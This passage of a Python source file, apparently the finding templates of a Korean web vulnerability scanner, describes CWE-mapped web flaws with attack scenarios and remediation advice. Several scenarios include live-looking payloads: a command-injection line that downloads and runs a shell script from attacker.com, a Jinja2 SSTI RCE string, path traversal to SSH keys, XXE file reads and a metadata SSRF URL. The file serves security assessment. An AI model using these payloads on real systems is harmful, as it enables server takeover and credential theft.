        "title": "무차별 대입(브루트포스) 방어 부재 — 시도 횟수 임계치 없음",
        "description": (
            "로그인(또는 인증번호) 입력에 계정 잠금·rate limit·CAPTCHA 같은 '시도 횟수 임계치'가 "
            "없습니다. 연속 실패에도 아무 제한이 걸리지 않아, 공격자가 사전/무차별 대입을 무제한 반복해 "
            "비밀번호나 인증번호(OTP)를 알아낼 수 있습니다(CWE-307). 본 점검은 실제 계정을 크래킹하지 "
            "않고 '존재하지 않는 사용자명+오답'으로 임계치 부재만 비파괴로 확인했습니다."
        ),
        "attack_vector": (
            "로그인 폼에 동일 계정으로 다수의 비밀번호를 자동 대입 → 잠금/지연/CAPTCHA 가 없으면 "
            "가능한 조합을 모두 시도해 자격증명을 획득."
        ),
        "attack_scenario": (
            "1. 대상 로그인 폼 확인(계정 잠금·CAPTCHA·rate limit 부재)\n"
            "2. 사전 공격(흔한 비밀번호)·자격증명 스터핑·무차별 대입 자동화\n"
            "3. 시도 제한이 없어 정답에 도달 → 계정 탈취\n"
            "4. 인증번호(OTP)가 대상이면 짧은 숫자 공간을 전수 대입 → 인증 우회"
        ),
        "tools": ["hydra", "burpsuite(intruder)", "medusa"],
        "cve_references": [],
        "lab_guide": "DVWA Brute Force 모듈, OWASP Authentication Cheat Sheet",
        "recommendation": (
            "연속 실패 시 계정 잠금(또는 점증 지연)·IP 기반 rate limit·CAPTCHA 를 도입하세요. "
            "인증번호(OTP)는 시도 횟수 제한과 짧은 만료를 적용하고, 다단계 인증(MFA)을 권장합니다."
        ),
    },
    "error_info_disclosure": {
        "id": "WEB-INFO-209",
        "category": "에러 페이지 내 정보 노출 — 시스템 정보 노출 (Verbose Error)",
        "cwe": "CWE-209",
        "kisa_category": "정보 노출",
        "business_impact": "DB 엔진·버전·SQL 구문·내부 경로 등이 오류 메시지로 노출되어 후속 공격(주입·경로추적)의 정확도를 높여줌",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Low",
        "title": "에러 페이지 내 정보 노출 — 시스템 정보 노출(DB/서버/경로)",
        "description": ("입력 오류·예외 상황에서 서버가 상세 오류 메시지(DB 엔진 종류·버전, SQL 구문, 스택 트레이스, "
                        "내부 경로 등)를 응답에 그대로 노출합니다. 공격자는 이 정보로 DBMS 를 특정하고 인젝션·경로추적 "
                        "등 후속 공격을 정밀화할 수 있습니다(CWE-209)."),
        "attack_vector": "비정상 입력(따옴표·형변환 오류 등)을 유발해 서버의 상세 오류 메시지를 응답에서 수집.",
        "attack_scenario": ("1. 파라미터에 구문 오류를 유발하는 값 입력\n"
                            "2. 서버가 DB/프레임워크 오류 메시지를 응답에 그대로 반환\n"
                            "3. 노출된 DBMS·버전·구조 정보로 후속 공격(인젝션 등)을 정밀화"),
        "tools": ["burpsuite", "curl"],
        "cve_references": [],
        "lab_guide": "OWASP Improper Error Handling / PortSwigger Information Disclosure Labs",
        "recommendation": ("운영 환경에서 상세 오류 표시를 끄고(예: PHP display_errors=Off, 프레임워크 debug=false), "
                           "사용자에게는 일반 오류 페이지만 반환하며 상세 오류는 서버 내부 로그로만 남기세요."),
    },
    "csrf": {
        "id": "WEB-CF-ACTIVE",
        "category": "크로스사이트 요청 위조 (CSRF)",
        "cwe": "CWE-352",
        "kisa_category": "클라이언트사이드 취약점",
        "business_impact": "피해자 권한으로 임의 요청 전송 가능, 비밀번호 변경·계좌 이체 등 중요 기능 무단 수행",
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Medium",
        "title": "CSRF 취약점 실증 확인 — 토큰 검증 미흡",
        "description": (
            "POST 요청에 CSRF 토큰이 없거나 서버가 토큰을 실제로 검증하지 않습니다. "
            "공격자가 피해자의 권한으로 임의 요청을 전송할 수 있습니다."
        ),
        "attack_vector": (
            "공격자 사이트에 숨겨진 폼을 배치 → 피해자 방문 시 자동 제출 → "
            "피해자 인증 쿠키로 서버에 임의 요청 전송."
        ),
        "attack_scenario": (
            "1. 공격자 사이트에 PoC HTML 폼 배치\n"
            "2. 피해자가 로그인 상태로 공격자 사이트 방문\n"
            "3. 폼 자동 제출 → 피해자 권한으로 비밀번호 변경/계좌 이체 등 수행\n"
            "4. 피해자는 요청이 전송된 사실을 인지하지 못함"
        ),
        "tools": ["burpsuite", "csrftester", "owasp-zap"],
        "cve_references": [],
        "lab_guide": "DVWA CSRF 모듈, PortSwigger CSRF Labs",
        "recommendation": (
            "모든 상태 변경 요청에 CSRF 토큰을 발급하고 서버에서 검증하세요. "
            "SameSite=Strict/Lax 쿠키 속성과 Origin/Referer 헤더 검증을 함께 적용하세요."
        ),
    },
    # ── 후보(candidate) 템플릿 — 자동 공격 미수행, 수동 검토(참고) 분류 ──────────
    "idor": {
        "id": "WEB-AC-IDOR-639",
        "category": "접근 제어 — IDOR(안전하지 않은 직접 객체 참조)",
        "cwe": "CWE-639",
        "kisa_category": "접근 제어 취약점",
        "business_impact": "로그인만 하면 소유권 검증 없이 타 사용자의 객체(회원/주문/문서 등)를 열람 가능 — 개인정보 대량 유출",
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Low",
        "title": "IDOR 취약점 — 소유권 검증 없는 객체 접근 실증",
        "description": (
            "인증 세션에서 객체 참조 파라미터(id 등)를 다른 값으로 치환하자, 무인증으론 접근할 수 없는 "
            "자원인데도 '다른 객체'가 그대로 열람되었습니다. 즉 서버가 '로그인 여부'만 확인하고 '소유권/권한'은 "
            "검증하지 않아, 공격자가 식별자를 순회해 타 사용자 데이터를 열람할 수 있습니다(CWE-639, 읽기전용 비파괴 확증)."
        ),
        "attack_vector": "인증 세션에서 객체 식별자(?id=1001)를 타 값(1002·1·2 등)으로 치환해 GET 접근.",
        "attack_scenario": (
            "1. 본인 객체(?id=본인값) 정상 열람 확인\n"
            "2. 식별자를 타 값으로 치환 → 다른 객체가 반환됨\n"
            "3. 동일 자원이 무인증으론 접근 불가 → '로그인만' 하면 임의 객체 열람(소유권 미검증)\n"
            "4. 식별자 순회로 전체 사용자 데이터 수집"
        ),
        "tools": ["burpsuite", "autorize"],
        "cve_references": [],
        "lab_guide": "PortSwigger Access Control Labs, OWASP BOLA(IDOR)",
        "recommendation": (
            "객체 접근 시 세션 사용자의 소유/권한을 서버에서 반드시 검증하고, 직접 참조 대신 "
            "간접 참조(매핑 토큰)나 권한 기반 조회를 적용하십시오."
        ),
    },
    "idor_candidate": {
        "id": "WEB-AC-IDOR-CAND",
        "category": "접근 제어 — IDOR 후보",
        "cwe": "CWE-639",
        "kisa_category": "접근 제어 취약점",
        "business_impact": "권한 검증이 미흡하면 다른 사용자의 객체(주문/회원/게시글 등)에 접근될 수 있음",
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Medium",
        "candidate": True,
        "title": "[참고] IDOR 가능성 — 객체 참조 파라미터 발견 (수동 검토 필요)",
        "description": (
            "id/uid/userId/accountId/seq/no/idx/memberId/orderId/boardId 등 객체를 직접 "
            "참조하는 파라미터가 발견되었습니다. 권한 검증이 미흡할 경우 다른 사용자의 객체에 "
            "접근(IDOR)할 수 있어 수동 검토가 필요합니다. 자동 공격(값 치환 접근)은 수행하지 않았습니다."
        ),
        "attack_vector": "인증된 세션에서 객체 식별자 값을 타 사용자 값으로 치환해 접근 시도(수동 검증).",
        "attack_scenario": (
            "1. 객체 참조 파라미터(예: ?id=1001) 식별\n"
            "2. 인접/타 사용자 식별자(예: 1002)로 치환\n"
            "3. 권한 검증 없이 응답이 반환되면 IDOR 확정 — 본 점검은 후보 분류까지만 수행"
        ),
        "tools": ["burpsuite", "autorize", "수동 검토"],
        "cve_references": [],
        "lab_guide": "PortSwigger Access Control Labs, OWASP BOLA(IDOR)",
        "recommendation": (
            "객체 접근 시 세션 사용자 소유/권한을 서버에서 반드시 검증하고, 직접 참조 대신 "
            "간접 참조(매핑 토큰)나 권한 기반 조회를 적용하십시오."
        ),
    },
    "csrf_candidate": {
        "id": "WEB-CF-CSRF-CAND",
        "category": "크로스사이트 요청 위조 (CSRF) — 후보",
        "cwe": "CWE-352",
        "kisa_category": "클라이언트사이드 취약점",
        "business_impact": "상태 변경 요청에 CSRF 방어가 없으면 피해자 권한으로 임의 요청이 전송될 수 있음",
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Medium",
        "candidate": True,
        "title": "[참고] CSRF 가능성 — 토큰 부재/SameSite 미흡 (수동 검토 필요)",
        "description": (
            "상태 변경성 요청(POST/PUT/DELETE)에 anti-CSRF 토큰이 없거나 세션 쿠키의 SameSite "
            "속성이 미흡합니다. Origin/Referer 검증 여부가 불명확하여 CSRF 가능성을 수동 검토해야 "
            "합니다. 실제 상태 변경 요청은 수행하지 않았습니다."
        ),
        "attack_vector": "공격자 페이지에서 교차 출처로 상태 변경 요청 자동 전송(수동 검증 필요).",
        "attack_scenario": (
            "1. 토큰 없는 상태변경 요청/SameSite 미흡 쿠키 식별\n"
            "2. 교차 출처 요청에 대한 Origin/Referer·토큰 검증 여부 수동 확인\n"
            "3. 검증이 없으면 CSRF 확정 — 본 점검은 후보 분류까지만 수행"
        ),
        "tools": ["burpsuite", "owasp-zap", "수동 검토"],
        "cve_references": [],
        "lab_guide": "PortSwigger CSRF Labs, DVWA CSRF",
        "recommendation": (
            "모든 상태 변경 요청에 CSRF 토큰을 발급·검증하고, 세션 쿠키에 SameSite=Lax/Strict를 "
            "설정하며 Origin/Referer 헤더 검증을 함께 적용하십시오."
        ),
    },
    "business_logic_candidate": {
        "id": "WEB-BL-CAND",
        "category": "비즈니스 로직 — 파라미터 변조 후보",
        "cwe": "CWE-840",
        "kisa_category": "비즈니스 로직 취약점",
        "business_impact": "가격/권한/포인트 등 민감 파라미터 변조 시 금전적·권한 피해 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "6.0",
        "exploitation_difficulty": "Medium",
        "candidate": True,
        "title": "[참고] 비즈니스 로직 후보 — 민감 파라미터 발견 (수동 검토 필요)",
        "description": (
            "role/admin/price/amount/discount/point/balance/approval/permission 등 "
            "비즈니스 로직에 영향을 주는 파라미터가 발견되었습니다. 서버측 검증이 미흡하면 "
            "가격 조작·권한 상승 등이 가능할 수 있어 수동 검토가 필요합니다. 자동 조작은 미수행."
        ),
        "attack_vector": "요청의 민감 파라미터 값을 변조(가격↓/권한↑)하여 서버 검증 우회 시도(수동).",
        "attack_scenario": (
            "1. 가격/권한/포인트 등 파라미터 식별\n"
            "2. 값 변조 후 서버측 재검증 여부 수동 확인\n"
            "3. 검증이 없으면 로직 취약 — 본 점검은 후보 분류까지만 수행"
        ),
        "tools": ["burpsuite", "수동 검토"],
        "cve_references": [],
        "lab_guide": "OWASP Business Logic Testing, PortSwigger Logic Flaws",
        "recommendation": (
            "가격·권한·수량 등 모든 민감 값은 서버에서 권한/소유/범위를 재검증하고, "
            "클라이언트 입력을 신뢰하지 마십시오."
        ),
    },
    "file_upload_candidate": {
        "id": "WEB-UP-CAND",
        "category": "파일 업로드 — 통제 점검 후보",
        "cwe": "CWE-434",
        "kisa_category": "파일 업로드 취약점",
        "business_impact": "확장자/콘텐츠 검증 미흡 시 악성 파일 업로드로 원격 코드 실행 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Medium",
        "candidate": True,
        "title": "[참고] 파일 업로드 후보 — 업로드 폼 발견 (수동 검토 필요)",
        "description": (
            "파일 업로드(multipart/form-data, file input) 폼이 발견되었습니다. "
            "서버측 확장자/콘텐츠 타입 검증 여부를 수동 확인해야 합니다. 실제 파일/웹쉘 "
            "업로드는 수행하지 않았습니다."
        ),
        "attack_vector": "허용되지 않는 확장자/콘텐츠의 파일 업로드 가능 여부 수동 검증.",
        "attack_scenario": (
            "1. 업로드 폼/accept 속성/업로드 경로 식별\n"
            "2. 서버측 확장자·MIME·콘텐츠 검증 여부 수동 확인\n"
            "3. 검증이 없으면 업로드 취약 — 본 점검은 후보 분류까지만 수행(업로드 미수행)"
        ),
        "tools": ["burpsuite", "수동 검토"],
        "cve_references": [],
        "lab_guide": "OWASP File Upload Testing, PortSwigger File Upload Labs",
        "recommendation": (
            "서버측에서 확장자 화이트리스트·MIME·매직바이트를 검증하고, 업로드 경로를 "
            "실행 불가 위치에 저장하며 임의 파일명/경로를 차단하십시오."
        ),
    },
    "lfi": {
        "id": "WEB-PT-LFI-ACTIVE",
        "category": "경로 추적 (LFI)",
        "cwe": "CWE-22",
        "kisa_category": "경로 추적 / 파일 노출",
        "business_impact": "서버 설정파일·SSH 키 탈취, 추가 공격 기반 마련",
        "severity": "HIGH",
        "cvss_estimate": "8.6",
        "exploitation_difficulty": "Easy",
        "title": "LFI/경로 추적 취약점 — 시스템 파일 노출 확인",
        "description": (
            "파라미터로 시스템 파일 경로를 조작하여 서버의 민감한 파일을 읽을 수 있습니다. "
            "/etc/passwd 등 시스템 파일 내용이 실제로 노출되었습니다."
        ),
        "attack_vector": (
            "file=../../../../etc/passwd 형태의 경로 순회 페이로드 →  "
            "서버 사용자 목록, 설정 파일, SSH 키 등 민감 파일 노출."
        ),
        "attack_scenario": (
            "1. file=../../../../etc/passwd 로 /etc/passwd 내용 획득\n"
            "2. 사용자 계정 목록 및 홈 디렉터리 경로 파악\n"
            "3. ~/.ssh/id_rsa 로 SSH 비공개 키 탈취\n"
            "4. 탈취한 SSH 키로 서버 직접 접속"
        ),
        "tools": ["burpsuite", "dotdotpwn", "fimap"],
        "cve_references": [],
        "lab_guide": "DVWA File Inclusion 모듈, HackTheBox LFI 챌린지",
        "recommendation": (
            "파일 경로 파라미터를 사용자 입력으로 받지 마세요. "
            "불가피한 경우 화이트리스트로 허용 경로를 제한하고, "
            "경로 정규화 후 허용 디렉터리 외부 접근을 차단하세요."
        ),
    },
    "cmd_injection": {
        "id": "WEB-CMDI-ACTIVE",
        "category": "명령어 인젝션",
        "cwe": "CWE-78",
        "kisa_category": "명령어 인젝션",
        "business_impact": "서버 완전 장악, 내부망 횡이동, 랜섬웨어 배포 가능",
        "severity": "HIGH",
        "cvss_estimate": "10.0",
        "exploitation_difficulty": "Medium",
        "title": "OS 명령어 인젝션 취약점 실증 확인",
        "description": (
            "파라미터를 통해 서버 OS 명령어를 실행할 수 있습니다. "
            "에코 토큰 반환 또는 시간 지연으로 취약점이 실증되었습니다."
        ),
        "attack_vector": (
            "; id, | whoami, $(cat /etc/passwd) 등의 페이로드로 OS 명령어 실행. "
            "서버 완전 장악 가능."
        ),
        "attack_scenario": (
            "1. 취약 파라미터에 ; id 삽입 → 실행 중인 사용자 계정 확인\n"
            "2. ; cat /etc/passwd → 시스템 사용자 목록 획득\n"
            "3. ; wget http://attacker.com/shell.sh -O /tmp/s; chmod +x /tmp/s; /tmp/s\n"
            "4. 리버스 쉘 획득 → 서버 완전 장악"
        ),
        "tools": ["burpsuite", "commix", "metasploit"],
        "cve_references": [],
        "lab_guide": "DVWA Command Injection 모듈, VulnHub OS 명령어 인젝션 챌린지",
        "recommendation": (
            "사용자 입력을 OS 명령어에 직접 사용하지 마세요. "
            "명령어 실행이 필요한 경우 파라미터화된 API를 사용하고, "
            "입력값 화이트리스트 검증 및 shell_exec, system() 함수 사용을 금지하세요."
        ),
    },
    "ssti": {
        "id": "WEB-SSTI-ACTIVE",
        "category": "서버사이드 템플릿 인젝션 (SSTI)",
        "cwe": "CWE-94",
        "kisa_category": "서버사이드 코드 실행",
        "business_impact": "서버에서 임의 코드 실행 가능, 파일 시스템 접근, 서버 완전 장악",
        "severity": "HIGH",
        "cvss_estimate": "9.8",
        "exploitation_difficulty": "Medium",
        "title": "서버사이드 템플릿 인젝션 (SSTI) 실증 확인",
        "description": (
            "템플릿 엔진이 사용자 입력을 실행 가능한 표현식으로 해석합니다. "
            "수식 평가 결과가 응답에 출력되어 RCE(원격 코드 실행)로 이어질 수 있습니다."
        ),
        "attack_vector": (
            "{{7*7}}, ${7*7} 등의 템플릿 표현식 주입 → 서버에서 평가 후 결과 반환. "
            "Jinja2: {{''.__class__.__mro__[1].__subclasses__()}} → 파이썬 코드 실행."
        ),
        "attack_scenario": (
            "1. {{7*7}} → 응답에 '49' 출력 (SSTI 확인)\n"
            "2. 템플릿 엔진 특정 후 RCE 페이로드 구성\n"
            "3. Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "4. 서버 OS 명령어 실행 → 파일 시스템 접근 → 서버 장악"
        ),
        "tools": ["tplmap", "burpsuite", "ssti-payloads"],
        "cve_references": [],
        "lab_guide": "PortSwigger SSTI Labs, HackTheBox SSTI 챌린지",
        "recommendation": (
            "사용자 입력을 템플릿 문자열로 직접 렌더링하지 마세요. "
            "템플릿 엔진 샌드박스 모드를 활성화하고, 입력값을 템플릿 변수로만 전달하세요."
        ),
    },
    "ssrf": {
        "id": "WEB-SSRF-ACTIVE",
        "category": "서버사이드 요청 위조 (SSRF)",
        "cwe": "CWE-918",
        "kisa_category": "서버사이드 요청 위조",
        "business_impact": "클라우드 메타데이터 탈취, 내부망 서비스 접근, IAM 자격증명 탈취로 클라우드 인프라 장악 가능",
        "severity": "HIGH",
        "cvss_estimate": "8.6",
        "exploitation_difficulty": "Medium",
        "title": "SSRF 취약점 — 내부망 요청 가능 확인",
        "description": (
            "서버가 파라미터로 전달된 URL로 내부망 요청을 수행합니다. "
            "클라우드 메타데이터, 내부 서비스에 접근할 수 있습니다."
        ),
        "attack_vector": (
            "url=http://169.254.169.254/latest/meta-data/ → AWS 인스턴스 메타데이터 탈취. "
            "url=http://내부서버/ → 방화벽 우회 내부망 접근."
        ),
        "attack_scenario": (
            "1. url=http://169.254.169.245/latest/meta-data/ → AWS 메타데이터 접근\n"
            "2. IAM 자격증명 토큰 탈취\n"
            "3. 탈취한 자격증명으로 AWS API 호출\n"
            "4. S3 버킷, EC2 인스턴스 등 클라우드 리소스 완전 장악"
        ),
        "tools": ["burpsuite", "ssrfmap", "gopherus"],
        "cve_references": [],
        "lab_guide": "PortSwigger SSRF Labs, HackTheBox SSRF 챌린지",
        "recommendation": (
            "URL 파라미터의 목적지를 화이트리스트로 제한하세요. "
            "내부 IP 대역(127.x, 10.x, 172.16-31.x, 192.168.x)으로의 요청을 차단하세요."
        ),
    },
    "xxe": {
        "id": "WEB-XXE-ACTIVE",
        "category": "XML 외부 엔티티 인젝션 (XXE)",
        "cwe": "CWE-611",
        "kisa_category": "XML 인젝션",
        "business_impact": "서버 파일 읽기, SSRF로 내부망 접근, DoS 공격 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.1",
        "exploitation_difficulty": "Medium",
        "title": "XXE 취약점 — 서버 파일 읽기 확인",
        "description": (
            "XML 파서가 외부 엔티티를 처리하여 서버 파일을 읽습니다. "
            "/etc/passwd 내용이 실제로 응답에 노출되었습니다."
        ),
        "attack_vector": (
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> 형태의 "
            "XML 페이로드로 파일 읽기, SSRF, DoS 공격 가능."
        ),
        "attack_scenario": (
            "1. XML 요청에 XXE 페이로드 삽입\n"
            "2. 서버 /etc/passwd, /etc/shadow, 웹 설정파일 내용 획득\n"
            "3. SSRF로 내부망 서비스 탐색\n"
            "4. 자격증명 탈취 → 서버 장악"
        ),
        "tools": ["burpsuite", "xxetool", "owasp-zap"],
        "cve_references": [],
        "lab_guide": "PortSwigger XXE Labs, WebGoat XXE 모듈",
        "recommendation": (
            "XML 파서에서 외부 엔티티 처리를 비활성화하세요. "
            "(Java: DocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true))"
        ),
    },
    "open_redirect": {
        "id": "WEB-OR-ACTIVE",
        "category": "오픈 리다이렉트",
        "cwe": "CWE-601",
        "kisa_category": "인증 / 리다이렉트",
        "business_impact": "피싱 사이트로 사용자 유도, OAuth 토큰 탈취, 신뢰 도메인을 이용한 사기 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "6.1",
        "exploitation_difficulty": "Easy",
        "title": "오픈 리다이렉트 취약점 확인",
        "description": (
            "파라미터로 전달된 임의 URL로 리다이렉트됩니다. "
            "피싱 공격 및 OAuth 토큰 탈취에 악용될 수 있습니다."
        ),
        "attack_vector": (
            "신뢰할 수 있는 도메인의 URL처럼 보이지만 실제로는 공격자 사이트로 이동. "
            "예: https://trusted-site.com/redirect?url=https://phishing-site.com"
        ),
        "attack_scenario": (
            "1. 공격자가 정상 도메인+오픈 리다이렉트 URL을 피해자에게 전송\n"
            "2. 피해자가 URL을 신뢰하고 클릭\n"
            "3. 실제로는 피싱 사이트로 이동\n"
            "4. 자격증명 입력 시 탈취"
        ),
        "tools": ["burpsuite", "curl"],
        "cve_references": [],
        "lab_guide": "PortSwigger Open Redirect Labs",
        "recommendation": (
            "리다이렉트 URL을 화이트리스트로 제한하거나, "
            "절대 URL 대신 상대 경로만 허용하세요."
        ),
    },
    "cors": {
        "id": "WEB-CORS-ACTIVE",
        "category": "CORS 설정 미흡",
        "cwe": "CWE-942",
        "kisa_category": "클라이언트사이드 취약점",
        "business_impact": "임의 도메인에서 피해자 쿠키 포함 요청 가능, 개인정보·API 응답 탈취",
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Medium",
        "title": "CORS 설정 미흡 — 임의 오리진 허용 확인",
        "description": (
            "임의의 오리진에서 크로스-도메인 요청이 허용됩니다. "
            "자격증명 포함 요청까지 허용하는 경우 계정 탈취로 이어질 수 있습니다."
        ),
        "attack_vector": (
            "공격자 도메인에서 fetch() 요청 → 피해자 쿠키 포함 → 서버가 응답 반환 → "
            "공격자가 피해자 데이터 열람."
        ),
        "attack_scenario": (
            "1. 공격자 사이트에서 피해 서버로 XMLHttpRequest 전송\n"
            "2. 피해자 브라우저의 세션 쿠키가 포함됨\n"
            "3. 서버가 CORS 허용 → 공격자가 응답 데이터 수신\n"
            "4. 피해자의 개인정보, API 응답 탈취"
        ),
        "tools": ["burpsuite", "cors-poc-generator"],
        "cve_references": [],
        "lab_guide": "PortSwigger CORS Labs",
        "recommendation": (
            "Access-Control-Allow-Origin을 명시적인 허용 도메인 목록으로 제한하세요. "
            "와일드카드(*)와 Access-Control-Allow-Credentials: true를 동시에 사용하지 마세요."
        ),
    },
    "crlf": {
        "id": "WEB-CRLF-ACTIVE",
        "category": "CRLF 인젝션",
        "cwe": "CWE-93",
        "kisa_category": "헤더 인젝션",
        "business_impact": "HTTP 응답 헤더 조작, 세션 고정 공격, 응답 분리(Cache Poisoning) 공격 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "6.1",
        "exploitation_difficulty": "Medium",
        "title": "CRLF 인젝션 — 응답 헤더 삽입 확인",
        "description": (
            "파라미터에 CRLF(%0d%0a) 문자를 삽입하여 HTTP 응답 헤더를 조작할 수 있습니다. "
            "Set-Cookie 헤더 삽입, 응답 분리 공격에 악용됩니다."
        ),
        "attack_vector": (
            "?param=test%0d%0aSet-Cookie:session=attacker_session 삽입 →  "
            "응답에 공격자 제어 쿠키 설정 → 세션 고정 공격."
        ),
        "attack_scenario": (
            "1. CRLF 페이로드로 Set-Cookie 헤더 삽입\n"
            "2. 피해자에게 해당 URL 전달\n"
            "3. 피해자 브라우저에 공격자 쿠키 설정 (세션 고정)\n"
            "4. 피해자 로그인 후 세션 ID 예측 가능"
        ),
        "tools": ["burpsuite", "crlf-suite"],
        "cve_references": [],
        "lab_guide": "PortSwigger HTTP Header Injection Labs",
        "recommendation": "URL 파라미터에서 CR(%0d), LF(%0a) 문자를 필터링하세요.",
    },
    "dom_xss": {
        "id": "WEB-XS-DOM-ACTIVE",
        "category": "DOM 기반 XSS",
        "cwe": "CWE-79",
        "kisa_category": "XSS",
        "business_impact": "세션 쿠키 탈취를 통한 계정 하이재킹, 피싱 페이지 삽입, 관리자 권한 탈취 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "6.1",
        "exploitation_difficulty": "Medium",
        "title": "DOM 기반 XSS (DOM-based XSS) 실증 확인",
        "description": (
            "JavaScript 소스에서 DOM XSS 위험 소스(location.hash 등)가 "
            "위험 싱크(innerHTML, eval 등)로 흐르는 패턴이 발견되었습니다."
        ),
        "attack_vector": (
            "URL 해시(#)에 <img src=x onerror=...> 삽입 → JavaScript가 innerHTML에 삽입 → "
            "서버 요청 없이 클라이언트에서만 XSS 실행."
        ),
        "attack_scenario": (
            "1. 공격자가 취약 URL에 #<img src=x onerror=alert(1)> 추가\n"
            "2. 피해자에게 URL 전달\n"
            "3. 브라우저에서 JavaScript가 hash 값을 DOM에 삽입\n"
            "4. XSS 실행 → 세션 탈취"
        ),
        "tools": ["dominator-pro", "burpsuite", "zaproxy"],
        "cve_references": [],
        "lab_guide": "PortSwigger DOM XSS Labs",
        "recommendation": (
            "innerHTML, document.write 대신 textContent, createElement를 사용하세요. "
            "사용자 제어 가능한 소스를 DOM 싱크에 직접 삽입하지 마세요."
        ),
    },
    "jwt": {
        "id": "WEB-JWT-ACTIVE",
        "category": "JWT 취약점",
        "cwe": "CWE-287",
        "kisa_category": "인증 취약점",
        "business_impact": "JWT 위조로 타인 계정 접근, 관리자 권한 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Medium",
        "title": "JWT 토큰 취약점 발견",
        "description": (
            "JWT 토큰에서 취약한 알고리즘 사용, 만료 검증 누락, 민감 정보 노출 등이 확인되었습니다."
        ),
        "attack_vector": (
            "alg:none → 서명 없이 토큰 위조. HS256 + 약한 키 → hashcat으로 브루트포스. "
            "토큰 페이로드 조작으로 권한 상승."
        ),
        "attack_scenario": (
            "1. alg:none 취약점: JWT 서명 제거 + payload 조작 (admin:true) → 서버 수락\n"
            "2. HS256 약한 키: jwt_secret 등 흔한 키로 브루트포스 → 토큰 위조\n"
            "3. 위조된 토큰으로 관리자 권한 획득"
        ),
        "tools": ["jwt_tool", "hashcat", "burpsuite"],
        "cve_references": [],
        "lab_guide": "PortSwigger JWT Labs, jwt.io Debugger",
        "recommendation": (
            "RS256 등 비대칭 알고리즘을 사용하고, 강력한 시크릿 키를 사용하세요. "
            "alg:none을 명시적으로 거부하고, 만료(exp) 클레임을 반드시 검증하세요."
        ),
    },
    "nosql_injection": {
        "id": "WEB-NS-ACTIVE",
        "category": "NoSQL 인젝션",
        "cwe": "CWE-943",
        # 실증화(prove-or-drop): $ne(참)/$eq(거짓) 불린 차등 또는 Mongo 오류 시그니처로 '연산자 실제
        # 해석'을 확증한 경우에만 emit → CONFIRMED(취약). 미확증은 프로브가 폐기(양호)해 참고에 안 남김.
        "kisa_category": "데이터베이스 인젝션",
        "business_impact": "전체 데이터베이스 덤프, 고객 개인정보 유출, 인증 우회로 내부 시스템 접근 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.1",
        "exploitation_difficulty": "Medium",
        "title": "NoSQL 인젝션 실증 확인 (MongoDB 연산자 주입)",
        "description": (
            "MongoDB 연산자($ne/$gt/$regex/브래킷) 주입 시 $ne(참)와 $eq(거짓)의 응답이 결정적으로 "
            "달라지거나 MongoDB 드라이버/DB 오류 시그니처가 노출되어, 연산자가 실제 해석됨을 확증했습니다. "
            "비-Mongo 앱은 연산자를 미지 값으로 무시해 차이가 없으므로, 이 차등은 NoSQL 인젝션의 실증입니다(CWE-943)."
        ),
        "attack_vector": (
            '{"username": {"$ne": ""}, "password": {"$ne": ""}} 형태로 '
            "로그인 요청 → 모든 사용자 중 첫 번째 계정으로 인증 성공."
        ),
        "attack_scenario": (
            "1. JSON 바디에 $ne 연산자 삽입\n"
            "2. 모든 비밀번호 조건이 참이 되어 인증 우회\n"
            "3. 관리자 계정으로 로그인\n"
            "4. 서비스 완전 장악"
        ),
        "tools": ["burpsuite", "nosqli", "nosqlmap"],
        "cve_references": [],
        "lab_guide": "PortSwigger NoSQL Injection Labs",
        "recommendation": "MongoDB 입력값에서 $, . 등 연산자 문자를 필터링하고 스키마 검증을 수행하세요.",
    },
    "deserialization": {
        "id": "WEB-DS-ACTIVE",
        "category": "안전하지 않은 역직렬화",
        "cwe": "CWE-502",
        # 직렬화 객체 서명(rO0AB=Java 매직바이트, O:N:"..."=PHP 등)은 결정적 관측 → '노출'은 실증됨.
        # 익스플로잇(RCE)은 가젯 체인이 필요해 별도지만, '신뢰경계로 직렬화 객체가 오간다'는 사실
        # 자체가 확인된 위험 표면이므로 취약(CONFIRMED)으로 잡는다(수동검토로 미루지 않음).
        "kisa_category": "부적절한 입력값 검증",
        "business_impact": "신뢰되지 않은 직렬화 데이터를 역직렬화하면 원격 코드 실행·권한 상승·데이터 위변조로 이어질 수 있음",
        "severity": "MEDIUM",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "High",
        "title": "안전하지 않은 역직렬화 대상 노출 (직렬화 객체 감지)",
        "description": (
            "쿠키/파라미터/응답/ViewState 에서 직렬화 객체(Java rO0AB…/PHP O:…/.NET __VIEWSTATE 등)의 "
            "결정적 서명이 감지되었습니다 — 신뢰경계로 직렬화 데이터가 오가는 것이 확인되었습니다. "
            "서버가 무결성 검증(서명/MAC) 없이 역직렬화하면 가젯 체인으로 원격 코드 실행이 가능합니다. "
            "(노출·표면은 실증 확인. RCE 가젯 실증은 OOB 옵션에서 별도 승격.)"
        ),
        "attack_vector": (
            "노출된 직렬화 객체(예: Java rO0AB..., PHP O:..., .NET __VIEWSTATE)를 변조·재전송해 "
            "역직렬화 시점에 임의 객체/코드 실행을 유도(가젯 체인)."
        ),
        "attack_scenario": (
            "1. 직렬화 객체가 쿠키/파라미터로 오가는지 식별\n"
            "2. 무결성 보호(서명/MAC) 여부 확인\n"
            "3. 보호가 없으면 가젯 체인으로 역직렬화 RCE 가능성 검토"
        ),
        "tools": ["ysoserial", "phpggc", "viewstate", "burpsuite"],
